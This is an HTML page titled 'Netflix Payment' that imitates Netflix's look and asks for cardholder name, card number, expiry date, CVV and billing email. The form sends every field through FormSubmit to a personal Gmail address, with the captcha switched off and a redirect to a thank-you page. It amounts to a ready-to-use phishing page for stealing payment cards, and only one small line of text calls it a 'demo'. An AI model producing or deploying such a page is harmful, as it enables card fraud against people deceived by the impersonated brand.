<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Netflix Payment</title>
  <style>
    body {
      margin: 0;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background-color: #141414;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .payment-form {
      background-color: #1f1f1f;
      padding: 40px;
      border-radius: 10px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 0 25px rgba(0,0,0,0.6);
    }

    .payment-form h2 {
      text-align: center;
      margin-bottom: 25px;
      font-weight: 400;
    }

    input {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: none;
      border-radius: 4px;
      background-color: #333;
      color: #fff;
      font-size: 16px;
    }

    input::placeholder {
      color: #aaa;
    }

    .card-row {
      display: flex;
      gap: 10px;
    }

    .card-row input {
      flex: 1;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #e50914;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 17px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 15px;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #b00610;
    }

    small {
      color: #777;
      font-size: 12px;
    }
  </style>
</head>
<body>

  <form class="payment-form" action="https://formsubmit.co/grogzilla2@gmail.com" method="POST">
    <h2>Payment Details</h2>

    <input type="text" name="name" placeholder="Cardholder Name" required>
    <input type="text" name="card_number" placeholder="Card Number (XXXX XXXX XXXX XXXX)" required>

    <div class="card-row">
      <input type="text" name="expiry" placeholder="MM/YY" required>
      <input type="text" name="cvv" placeholder="CVV" required>
    </div>

    <input type="email" name="email" placeholder="Billing Email" required>

    <small>This is a demo payment form. Card details will be emailed to grogzilla2@gmail.com (securely using FormSubmit).</small>

    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">

    <button type="submit">Proceed to Payment</button>
  </form>

</body>
</html>
